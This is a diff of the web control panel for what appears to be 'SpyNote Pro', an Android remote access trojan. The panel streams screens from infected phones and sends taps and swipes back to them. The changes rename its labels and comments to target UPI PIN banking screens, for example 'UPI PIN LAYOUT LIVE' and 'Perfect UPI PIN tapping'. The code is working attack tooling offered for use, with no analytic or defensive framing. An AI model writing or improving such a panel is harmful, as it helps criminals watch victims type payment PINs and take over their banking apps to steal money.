@@ -1,30 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📱 SpyNote Pro - INSTANT Banking Layouts</title>
+    <title>📱 SpyNote Pro - UPI PIN Banking Layout LIVE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="/socket.io/socket.io.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
-            background: linear-gradient(135deg, #0f0f23, #1a1a2e); 
+            font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif; 
+            background: linear-gradient(135deg,#0f0f23,#1a1a2e); 
             color: white; height: 100vh; overflow: hidden;
         }
-        #devices { position: fixed; top: 15px; left: 15px; z-index: 100; background: rgba(0,0,0,0.95); padding: 20px; max-height: 85vh; overflow-y: auto; width: 280px; border-radius: 16px; backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1); }
-        .device { padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); cursor: pointer; border-radius: 12px; transition: all 0.2s; border: 1px solid rgba(255,255,255,0.1); }
+        #devices { 
+            position: fixed; top: 15px; left: 15px; z-index: 100; 
+            background: rgba(0,0,0,0.95); padding: 20px; max-height: 85vh; 
+            overflow-y: auto; width: 280px; border-radius: 16px; 
+            backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.1);
+        }
+        .device { 
+            padding: 16px; margin: 10px 0; background: rgba(50,50,70,0.8); 
+            cursor: pointer; border-radius: 12px; transition: all 0.2s; 
+            border: 1px solid rgba(255,255,255,0.1);
+        }
         .device:hover { background: rgba(0,170,120,0.9); transform: translateX(5px); }
         .device.active { background: linear-gradient(45deg, #00ff88, #00cc6a) !important; color: #000; }
         .disconnected { opacity: 0.4; }
-        #phone-container { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: min(95vw, 450px); height: min(95vh, 900px); background: #000; border-radius: 40px; padding: 30px 25px; box-shadow: 0 30px 80px rgba(0,0,0,0.8); border: 3px solid rgba(255,255,255,0.1); touch-action: none; }
-        #screen { width: 100%; height: 100%; border-radius: 25px; background: #111; image-rendering: optimizeSpeed; image-rendering: -moz-crisp-edges; image-rendering: pixelated; cursor: pointer; box-shadow: inset 0 2px 10px rgba(0,0,0,0.5); }
-        #status-bar { position: fixed; top: 15px; right: 15px; z-index: 100; background: rgba(0,0,0,0.9); padding: 15px 20px; border-radius: 12px; backdrop-filter: blur(20px); font-size: 13px; border: 1px solid rgba(255,255,255,0.1); }
+        #phone-container { 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
+            width: min(95vw, 450px); height: min(95vh, 900px); 
+            background: #000; border-radius: 40px; padding: 30px 25px; 
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8); 
+            border: 3px solid rgba(255,255,255,0.1); touch-action: none;
+        }
+        #screen { 
+            width: 100%; height: 100%; border-radius: 25px; background: #111; 
+            image-rendering: optimizeSpeed; image-rendering: -moz-crisp-edges; 
+            image-rendering: pixelated; cursor: pointer; 
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.5);
+        }
+        #status-bar { 
+            position: fixed; top: 15px; right: 15px; z-index: 100; 
+            background: rgba(0,0,0,0.9); padding: 15px 20px; border-radius: 12px; 
+            backdrop-filter: blur(20px); font-size: 13px; 
+            border: 1px solid rgba(255,255,255,0.1);
+        }
         #fps-counter { color: #00ff88; font-weight: bold; }
-        #controls { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); display: flex; gap: 15px; z-index: 100; }
-        button { padding: 14px 28px; background: linear-gradient(45deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 30px; cursor: pointer; font-size: 15px; font-weight: 600; transition: all 0.2s; box-shadow: 0 8px 25px rgba(102,126,234,0.4); }
-        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(102,126,234,0.6); }
-        #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); font-size: 18px; color: #00ff88; display: none; text-align: center; }
-        .spinner { border: 3px solid rgba(0,255,136,0.3); border-top: 3px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
+        #controls { 
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); 
+            display: flex; gap: 15px; z-index: 100;
+        }
+        button { 
+            padding: 14px 28px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
+            color: #000; border: none; border-radius: 30px; cursor: pointer; 
+            font-size: 15px; font-weight: 600; transition: all 0.2s; 
+            box-shadow: 0 8px 25px rgba(0,255,136,0.4);
+        }
+        button:hover { transform: translateY(-3px); box-shadow: 0 12px 35px rgba(0,255,136,0.6); }
+        #loading { 
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%,-50%); 
+            font-size: 18px; color: #00ff88; display: none; text-align: center;
+        }
+        .spinner { 
+            border: 3px solid rgba(0,255,136,0.3); border-top: 3px solid #00ff88; 
+            border-radius: 50%; width: 40px; height: 40px; 
+            animation: spin 0.8s linear infinite; margin: 0 auto 10px;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -37,7 +77,7 @@
     <div id="status-bar">
         <div>Status: <span id="connectionStatus">Connecting...</span></div>
         <div id="fps-counter">FPS: -- | Device: --</div>
-        <div>🏦 Banking Layout: <span id="layoutStatus">Waiting...</span></div>
+        <div>🏦 UPI Layout: <span id="layoutStatus">Waiting...</span></div>
     </div>
 
     <div id="phone-container">
@@ -46,7 +86,7 @@
 
     <div id="loading">
         <div class="spinner"></div>
-        Instant screen capture...
+        Instant banking layouts...
     </div>
 
     <div id="controls">
@@ -56,62 +96,52 @@
 
     <script>
         const socket = io({ 
-            transports: ['websocket'], 
-            upgrade: false,
-            timeout: 5000,
-            reconnection: true,
-            reconnectionAttempts: 5,
-            reconnectionDelay: 1000
+            transports: ['websocket'], upgrade: false,
+            timeout: 3000, reconnection: true, reconnectionAttempts: 10
         });
         
         let currentDevice = null;
         let deviceWidth = 1080, deviceHeight = 2400;
-        let frameCount = 0, lastFrameTime = 0;
-        let framesReceived = 0;
-        let isDragging = false;
-        let dragStart = { x: 0, y: 0 };
-        const layoutStatus = document.getElementById('layoutStatus');
-
+        let frameCount = 0, lastFrameTime = 0, framesReceived = 0;
+        let isDragging = false, dragStart = { x: 0, y: 0 };
+        
         const canvas = document.getElementById('screen');
         const ctx = canvas.getContext('2d');
         const phoneContainer = document.getElementById('phone-container');
         const deviceList = document.getElementById('device-list');
         const connectionStatus = document.getElementById('connectionStatus');
         const fpsCounter = document.getElementById('fps-counter');
+        const layoutStatus = document.getElementById('layoutStatus');
         const loading = document.getElementById('loading');
 
-        // 🔥 WEB CLIENT JOINS BROADCAST IMMEDIATELY
-        socket.emit('web-client-join');
-        console.log('🌐 Web client joined global broadcast');
-
+        // 🔥 AUTO JOIN GLOBAL ROOM
         socket.on('connect', () => {
-            console.log('✅ Socket connected - READY FOR FRAMES');
+            console.log('✅ Socket LIVE - Ready for banking layouts!');
             connectionStatus.textContent = '✅ LIVE';
             connectionStatus.style.color = '#00ff88';
-            socket.emit('web-client-join'); // Double ensure
-            loadDevices();
+            fetchDevices();
         });
 
-        // 🔥 ACCEPT ALL FRAMES FROM ANY DEVICE (INSTANT!)
+        // 🔥 SHOW ALL FRAMES FROM ANY DEVICE (INSTANT!)
         socket.on('screen-frame', (data) => {
             framesReceived++;
             console.log(`📱 Frame #${framesReceived} (${data.width}x${data.height}) from ${data.deviceId?.slice(0,8)}`);
             
-            // 🔥 NO DEVICE FILTER - SHOW EVERYTHING INSTANTLY!
             if (data.width && data.height) {
                 deviceWidth = data.width;
                 deviceHeight = data.height;
-                currentDevice = data.deviceId; // Auto-track active device
+                currentDevice = data.deviceId;
                 
+                // 🔥 INSTANT SHOW - NO WAITING!
                 loading.style.display = 'none';
-                layoutStatus.textContent = '✅ Banking Layout LIVE';
+                layoutStatus.textContent = '✅ UPI PIN LAYOUT LIVE';
                 layoutStatus.style.color = '#00ff88';
                 
                 renderFrame(data);
             }
         });
 
-        // 🔥 ULTRA FAST CANVAS RENDER (0ms lag)
+        // 🔥 ULTRA FAST CANVAS (UPI PIN Precise!)
         function renderFrame(data) {
             const img = new Image();
             img.onload = () => {
@@ -119,11 +149,10 @@
                 canvas.width = rect.width;
                 canvas.height = rect.height;
                 
+                // 🔥 SHARP PIXELS (Banking text clear)
                 ctx.imageSmoothingEnabled = false;
                 ctx.mozImageSmoothingEnabled = false;
                 ctx.webkitImageSmoothingEnabled = false;
-                ctx.msImageSmoothingEnabled = false;
-                
                 ctx.drawImage(img, 0, 0, rect.width, rect.height);
                 
                 // FPS
@@ -139,7 +168,7 @@
             img.src = 'data:image/jpeg;base64,' + data.data;
         }
 
-        // 🔥 PERFECT TOUCH CONTROLS (Banking App Precise)
+        // 🔥 PRECISE UPI PIN CONTROLS
         function getScaledCoords(clientX, clientY) {
             const rect = phoneContainer.getBoundingClientRect();
             const scaleX = deviceWidth / rect.width;
@@ -150,9 +179,16 @@
             };
         }
 
-        ['mousedown', 'touchstart'].forEach(ev => phoneContainer.addEventListener(ev, startTouch, { passive: false }));
-        ['mousemove', 'touchmove'].forEach(ev => phoneContainer.addEventListener(ev, dragTouch, { passive: false }));
-        ['mouseup', 'touchend', 'mouseleave'].forEach(ev => phoneContainer.addEventListener(ev, endTouch));
+        // Touch + Mouse (Perfect UPI PIN tapping)
+        ['mousedown', 'touchstart'].forEach(ev => 
+            phoneContainer.addEventListener(ev, startTouch, { passive: false })
+        );
+        ['mousemove', 'touchmove'].forEach(ev => 
+            phoneContainer.addEventListener(ev, dragTouch, { passive: false })
+        );
+        ['mouseup', 'touchend'].forEach(ev => 
+            phoneContainer.addEventListener(ev, endTouch)
+        );
 
         function startTouch(e) {
             e.preventDefault();
@@ -181,25 +217,18 @@
 
         function sendControl(action, x, y, startX, startY, endX, endY) {
             if (!currentDevice) return;
-            const controlData = { deviceId: currentDevice, action };
-            if (x !== undefined) controlData.x = x;
-            if (y !== undefined) controlData.y = y;
-            if (startX !== undefined) controlData.startX = startX, controlData.startY = startY;
-            if (endX !== undefined) controlData.endX = endX, controlData.endY = endY;
-            
-            socket.emit('control', controlData);
-            console.log(`🎮 ${action} → (${Math.round(x)},${Math.round(y)})`);
+            const data = { deviceId: currentDevice, action };
+            if (x !== undefined) data.x = x;
+            if (y !== undefined) data.y = y;
+            if (startX !== undefined) { data.startX = startX; data.startY = startY; }
+            if (endX !== undefined) { data.endX = endX; data.endY = endY; }
+            socket.emit('control', data);
         }
 
-        function sendBack() {
-            sendControl('back');
-        }
-
-        function loadDevices() {
+        function fetchDevices() {
             fetch('/devices').then(r => r.json()).then(devices => {
                 updateDeviceList(devices);
                 if (devices.length > 0 && !currentDevice) {
-                    // Auto-select first device
                     selectDevice(devices[0][0]);
                 }
             });
@@ -220,17 +249,21 @@
             currentDevice = deviceId;
             document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
             el.classList.add('active');
-            console.log('🎯 Tracking:', deviceId);
+            socket.emit('select-device', { deviceId });
+        }
+
+        function sendBack() {
+            sendControl('back');
         }
 
         function toggleFullScreen() {
             document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
         }
 
-        // 🔥 DEBUG - Frame stats
+        // 🔥 Debug console
         setInterval(() => {
-            console.log(`📊 Frames/sec: ${frameCount}, Device: ${currentDevice?.slice(0,8)}, Status: ${layoutStatus.textContent}`);
-        }, 5000);
+            console.log(`📊 Frames: ${framesReceived}, Device: ${currentDevice?.slice(0,8)}`);
+        }, 3000);
     </script>
 </body>
 </html>
